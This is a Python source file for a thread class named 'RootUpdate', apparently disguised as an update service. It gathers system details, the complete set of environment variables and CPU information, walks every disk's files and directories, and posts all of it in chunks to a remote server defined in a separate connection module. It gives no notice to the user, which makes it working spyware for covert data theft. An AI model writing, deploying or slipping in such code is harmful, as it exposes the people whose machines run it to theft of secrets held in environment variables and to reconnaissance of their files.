import os
import sys
import json
import time
import flask
import cpuinfo
import requests
import platform
import threading
import connection
import system_file_structure

# gather system information
system_information = {
    'platform': platform.uname(),
    'executable-path': sys.executable,
    'environment': {e_key: e_value for (e_key, e_value) in os.environ.items()},

}

cpu_information = lambda: cpuinfo.get_cpu_info_json()

class RootUpdate(threading.Thread):
    
    __lock__ : bool = False

    def __init__(self):
        threading.Thread.__init__(self, name='RootUpdateService')
        _ = requests.post(connection.base_url + connection.routes['/dvi/system-information'], json={'content': json.dumps(system_information)})
        if(json.loads(_.text)['message'] != 'OK' or _.status_code != 200):
            raise requests.RequestException('failed to send system information, ' + _.reason)

        _ = requests.post(connection.base_url + connection.routes['/dvi/cpu-information'], json={'content': cpu_information()})
        if(json.loads(_.text)['message'] != 'OK' or _.status_code != 200):
            raise requests.RequestException('failed to send cpu information, ' + _.reason)

    def run(self):
        requests.post(connection.base_url + connection.routes['/dvi/fstructure-information'], 
            json={'status': 1, 'content': system_file_structure.available_disks}
        )
        system_file_structure.start_structure_threads()

        for (disk, disk_map) in system_file_structure.directory_map.items():
            if(len(disk_map['files']) < 1024 or len(disk_map['directories']) < 1024):
                try:
                    requests.post(connection.base_url + connection.routes['/dvi/fstructure-information'], 
                        json={'status': 2, 'disk': disk, 'content': {'files': disk_map['files'], 'directories': disk_map['directories']}}
                    )
                except Exception as ex:
                    print(ex)

                time.sleep(0.1)

            else:
                for apt_index in range(0, len(disk_map['files']), 2048):
                    try:
                        requests.post(connection.base_url + connection.routes['/dvi/fstructure-information'], 
                            json={'status': 2, 'disk': disk, 'content': {'files': disk_map['files'][apt_index : apt_index + 2048], 'directories': disk_map['directories'][apt_index : apt_index + 2048]}}
                        )
                    except Exception as ex:
                        print(ex)

                    time.sleep(0.1)
        
        requests.post(connection.base_url + connection.routes['/dvi/fstructure-information'], 
            json={'status': 0, 'content': 'finished uploading'}
        )

